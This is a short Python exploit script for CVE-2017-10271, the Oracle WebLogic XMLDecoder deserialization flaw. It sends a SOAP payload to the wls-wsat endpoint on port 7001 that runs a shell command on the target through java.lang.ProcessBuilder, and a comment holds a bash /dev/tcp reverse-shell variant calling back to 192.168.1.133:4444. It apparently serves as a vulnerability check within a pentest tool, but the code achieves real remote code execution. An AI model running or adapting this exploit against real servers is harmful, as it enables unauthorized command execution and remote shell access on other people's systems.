import requests
requests.packages.urllib3.disable_warnings()
def run(url):
    """CVE-2017-10271"""
    url = url + ":7001/wls-wsat/CoordinatorPortType"

    headers = {
            "Content-Type":"text/xml;charset=UTF-8",
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
    # <string>bash -i &gt;&amp; /dev/tcp/192.168.1.133/4444 0&gt;&amp;1</string>
    xml = """
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
            <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                    <java version="1.4.0" class="java.beans.XMLDecoder">
                        <void class="java.lang.ProcessBuilder">
                            <array class="java.lang.String" length="3">
                                <void index="0">
                                    <string>/bin/bash</string>
                                </void>
                                <void index="1">
                                    <string>-c</string>
                                </void>
                                <void index="2">
                                <string>id > /tmp/b4</string>
                                </void>
                            </array>
                        <void method="start"/></void>
                    </java>
                </work:WorkContext>
            </soapenv:Header>
        <soapenv:Body/>
        </soapenv:Envelope>"""
    req = requests.post(url, headers=headers, data=xml, timeout=3)
    if req.status_code == 500:
        return "WebLogic XMLDecoder Vulnerable"
    else:
        return False